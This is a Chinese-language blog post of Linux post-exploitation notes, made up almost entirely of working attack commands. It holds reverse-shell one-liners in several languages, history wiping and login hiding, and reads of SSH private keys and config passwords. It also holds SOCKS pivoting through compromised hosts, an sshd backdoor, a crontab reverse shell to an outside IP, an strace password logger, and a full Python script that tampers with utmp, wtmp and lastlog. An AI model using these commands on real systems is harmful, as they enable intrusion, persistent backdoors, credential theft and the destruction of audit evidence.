---
layout: post
title: "Linux Penetration"
description: "Hacking"
headline: 
modified: 2015-11-20
category: Hacking
tags: [Hacking]
imagefeature: 
mathjax: 
chart: 
author: Cupport
comments: true
featured: true
---

* 目录
{:toc}


本来是笔记本的东西 正好整理成MarkDown格式 就手抖push了一下

###反弹Shell

Bash

    bash -i >& /dev/tcp/10.0.0.1/1234 0>&1

Python

    python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
    
PERL

    perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

PHP
    
    php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'

Ruby

    ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

Java

    r = Runtime.getRuntime()
    p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/1234;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
    p.waitFor()

Telnet

    rm -f /tmp/p; mknod /tmp/p p && telnet ATTACKING-IP 80 0/tmp/p

    python -c 'import pty; pty.spawn("/bin/sh")'

###About SSH

w的时候看不到用户

    ssh -T root@8.8.8.8 bin/sh -i

远程登录时防止被记录到knowhosts文件

    ssh -o UserKnownHostsFile=/dev/null -T user@host /bin/bash -i

远程登录SSH后第一件事

    unset HISTFILE;export HISTFILE=;export HISTFILE=/dev/null;export HISTSIZE=0;export HISTFILESIZE=0;export HISTIGNORE=*;export HISTCONTROL=ignorespace

退出SSH要做的事情
    
    rm ~/.bash_history
    history -c

SSH开启socks5代理

在本地 8080 端口开 socks5 代理

    ssh -fND 127.0.0.1:8080 user@127.0.0.1

把 socks5 代理弹到 103.224.999.999 的 2333 端口

    ssh -fNR 2333:127.0.0.1:8080 forward@103.224.999.999

多一层中转更safe :)

##About Information

####操作系统

	cat /etc/issue
	cat /etc/*-release
	cat /etc/lsb-release
	cat /etc/redhat-release

####内核版本

    cat /proc/version   
	uname -a
	uname -mrs 
	rpm -q kernel 
	dmesg | grep Linux
	ls /boot | grep vmlinuz

####网络相关

    /sbin/ifconfig -a
    cat /etc/network/interfaces
    cd /etc/sysconfig/network-scripts/
    ls
    netstat -ant
    arp -e
	route
    tcpdump tcp dst 192.168.1.7 80 and tcp dst 10.2.2.222 21

####环境变量

	cat /etc/profile
	cat /etc/bashrc
	cat ~/.bash_profile
	cat ~/.bashrc
	cat ~/.bash_logout
	env
	set

####查看进程服务 找出root权限进程 :)

    ps aux | grep root
    ps -ef | grep root
    top
    cat /etc/service

####查看计划任务

    crontab -l
    crontab -e
    ls -alh /var/spool/cron
    ls -al /etc/ | grep cron
    ls -al /etc/cron*
    cat /etc/cron*
    cat /etc/at.allow
    cat /etc/at.deny
    cat /etc/cron.allow
    cat /etc/cron.deny
    cat /etc/crontab
    cat /etc/anacrontab
    cat /var/spool/cron/crontabs/root

###History

    history
    cat ~/.bash_history
    cat ~/.nano_history
    cat ~/.atftp_history
    cat ~/.mysql_history
    cat ~/.php_history
    cat ~/.bashrc
    cat ~/.profile
    cat /var/mail/root
    cat /var/spool/mail/root
    cat ~/.ssh/known_hosts

###private-key

    cat ~/.ssh/authorized_keys
    cat ~/.ssh/identity.pub
    cat ~/.ssh/identity
    cat ~/.ssh/id_rsa.pub
    cat ~/.ssh/id_rsa
    cat ~/.ssh/id_dsa.pub
    cat ~/.ssh/id_dsa
    cat /etc/ssh/ssh_config
    cat /etc/ssh/sshd_config
    cat /etc/ssh/ssh_host_dsa_key.pub
    cat /etc/ssh/ssh_host_dsa_key
    cat /etc/ssh/ssh_host_rsa_key.pub
    cat /etc/ssh/ssh_host_rsa_key
    cat /etc/ssh/ssh_host_key.pub
    cat /etc/ssh/ssh_host_key

常见的配置文件默认地址（其实用 locate 找更方便）：

    /usr/local/nginx/conf/nginx.conf
    /etc/httpd/conf/httpd.conf
    /etc/redis.conf
    /etc/rsyncd.conf
    /etc/samba/smb.conf
    /etc/my.conf
    /etc/mongodb.conf
    /etc/vsftpd/vsftpd.conf
    */.git/config
    */conf/svnserve.conf
    /etc/yum.repos.d/
    /etc/apt/sources.list


快速查看conf文件中包含password的项

    find /  -name "*.conf" 2>&1 | xargs grep -s -i 'password'


###内网代理以及后门


####内网代理

#####ssocks

1. Download http://sourceforge.net/projects/ssocks/
2. ./configure && make
3. cd src
4. nsocks 类似通过Socks5代理后的netcat，可用来测试
socks server ssocksd 用来开启Socks5代理服务 
ssocks 本地启用Socks5服务，并反弹到另一IP地址 
rcsocks 接收反弹过来的Socks5服务，并转向另一端口
eg:在肉鸡上执行

    ./rssocks -vv -s vpsip:1081
    
   在vps上执行
  
    ./rcsocks -l 1088 -p 1081 -vv

链接成功后 本机使用proxychains代理vpsip和端口即可

#####reGeorg

1. Download https://github.com/sensepost/reGeorg
2. 把相对应的shell传到网站上.


    python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp

####reprocks

1. Download https://github.com/RicterZ/reprocks

vps执行：server.py 8888 9999

肉鸡执行：client.py -m 1 vpsIP 8888  #这样就把socks5代理服务转出来了 

然后本机用vps的9999端口进行代理


肉鸡执行：client.py -m 2 内网IP 内网端口 vpsIP 8888  #这样就把内网别的端口服务转出来了 

肉鸡执行：client.py -m 3 7070 这样就只是在肉鸡上监听7070端口开启socks5代理服务

####BackDoor

Openssh BackDoor

会派生一个31337端口，然后连接31337，用root/bin/ftp/mail当用户名，密码随意，就可登陆。

    ln -sf /usr/sbin/sshd /tmp/su;/tmp/su -oPort=31337; 

一个后门

    cd /usr/sbin
    mv sshd ../bin
    echo '#!/usr/bin/perl' >sshd
    echo 'exec "/bin/sh" if (getpeername(STDIN) =~ /^..4A/);' >>sshd
    echo 'exec {"/usr/bin/sshd"} "/usr/sbin/sshd",@ARGV,' >>sshd
    chmod u+x sshd 
    /etc/init.d/sshd restart

之后本机执行

    socat STDIO TCP4:10.18.180.20:22,sourceport=13377 


记录ssh密码

    alias ssh='strace -o /tmp/.sshpwd-`date '+%d%h%m%s'`.log -e read.write.connect -s 2048 ssh' 


Crontab后门

    (crontab -l;printf "*/60 * * * * exec 9<> /dev/tcp/103.224.81.999/53;exec 0<&9;exec 1>&9 2>&1;/bin/bash --noprofile -i;\rno crontab for `whoami`%100c\n")|crontab -



###unix tips

unix自带了wtmp格式转换工具因此无需写程序条一命令即可修改last日志。

    /usr/lib/acct/fwtmp < /var/adm/wtmpx | sed "s/192.168.8.88/localhost/g" | /usr/lib/acct/fwtmp -ic > /var/adm/wtmpx

原理是先用fwtmp将wtmpx文件转换成ascii格式再用sed将登陆IP:192.168.8.88替换成localhost，(删除指定IP修改sed处)最后再用fwtmp转换成二进制格式覆盖回去。

同样也可以用于隐藏登陆用户

    /usr/lib/acct/fwtmp < /var/adm/utmpx | sed "/admin/d" | /usr/lib/acct/fwtmp -ic > /var/adm/utmpx

这样使用w命令就看不到admin用户了


###痕迹清理
touch -r 
shred删日志比rm安全:)


    #!/usr/bin/env python
    # -*- coding:utf-8 -*-
    # mail: cn.b4dboy@gmail.com
    
    import os, struct, sys
    from pwd import getpwnam
    from time import strptime, mktime
    from optparse import OptionParser
    UTMPFILE = "/var/run/utmp"
    WTMPFILE = "/var/log/wtmp"
    LASTLOGFILE = "/var/log/lastlog"
    LAST_STRUCT = 'I32s256s'
    LAST_STRUCT_SIZE = struct.calcsize(LAST_STRUCT)
    XTMP_STRUCT = 'hi32s4s32s256shhiii4i20x'
    XTMP_STRUCT_SIZE = struct.calcsize(XTMP_STRUCT)
    def getXtmp(filename, username, hostname):
    	xtmp = ''
    	try:
    		fp = open(filename, 'rb')
	    	while True:
		    	bytes = fp.read(XTMP_STRUCT_SIZE)
			    if not bytes:
				    break
		    	data = struct.unpack(XTMP_STRUCT, bytes)
			    record = [(lambda s: str(s).split("\0", 1)[0])(i) for i in data]
		    	if (record[4] == username and record[5] == hostname):
			    	continue
	    		xtmp += bytes
    	except:
    		showMessage('Cannot open file: %s' % filename)
    	finally:
    		fp.close()
    	return xtmp
    def modifyLast(filename, username, hostname, ttyname, strtime):
    	try:
    		p = getpwnam(username)
    	except:
    		showMessage('No such user.')
    	timestamp = 0
    	try:
    		str2time = strptime(strtime, '%Y:%m:%d:%H:%M:%S')
    		timestamp = int(mktime(str2time))
    	except:
    		showMessage('Time format err.')
    	data = struct.pack(LAST_STRUCT, timestamp, ttyname, hostname)
    	try:
    		fp = open(filename, 'wb')
    		fp.seek(LAST_STRUCT_SIZE * p.pw_uid)
    		fp.write(data)
    	except:
    		showMessage('Cannot open file: %s' % filename)
    	finally:
    		fp.close()
    	return True
        
    def showMessage(msg):
    	print msg
    	exit(-1)
        
    def saveFile(filename, contents):
    	try:
    		fp = open(filename, 'w+b')
    		fp.write(contents)
    	except IOError as e:
    		showMessage(e)
    	finally:
    		fp.close()
            
    if __name__ == '__main__':
    	usage = 'usage: logtamper.py -m 2 -u b4dboy -i 192.168.0.188\n \
    		logtamper.py -m 3 -u b4dboy -i 192.168.0.188 -t tty1 -d 2015:05:28:10:11:12'
    	parser = OptionParser(usage=usage)
    	parser.add_option('-m', '--mode', dest='MODE', default='1' , help='1: utmp, 2: wtmp, 3: lastlog [default: 1]')
    	parser.add_option('-t', '--ttyname', dest='TTYNAME')
    	parser.add_option('-f', '--filename', dest='FILENAME')
    	parser.add_option('-u', '--username', dest='USERNAME')
    	parser.add_option('-i', '--hostname', dest='HOSTNAME')
    	parser.add_option('-d', '--dateline', dest='DATELINE')
    	(options, args) = parser.parse_args()
    	if len(args) < 3:
    		if options.MODE == '1':
		    	if options.USERNAME == None or options.HOSTNAME == None:
	    			showMessage('+[Warning]: Incorrect parameter.\n')
	    		if options.FILENAME == None:
	    			options.FILENAME = UTMPFILE
	    		# tamper
	    		newData = getXtmp(options.FILENAME, options.USERNAME, options.HOSTNAME)
	    		saveFile(options.FILENAME, newData)
	    	elif options.MODE == '2':
		    	if options.USERNAME == None or options.HOSTNAME == None:
	    			showMessage('+[Warning]: Incorrect parameter.\n')
	    		if options.FILENAME == None:
	    			options.FILENAME = WTMPFILE
	    		# tamper
	    		newData = getXtmp(options.FILENAME, options.USERNAME, options.HOSTNAME)
	    		saveFile(options.FILENAME, newData)
    		elif options.MODE == '3':
		    	if options.USERNAME == None or options.HOSTNAME == None or options.TTYNAME == None or options.DATELINE == None:
			    	showMessage('+[Warning]: Incorrect parameter.\n')
		    	if options.FILENAME == None:
			    	options.FILENAME = LASTLOGFILE
		    	# tamper
		    	modifyLast(options.FILENAME, options.USERNAME, options.HOSTNAME, options.TTYNAME , options.DATELINE)
		    else:
		    	parser.print_help()

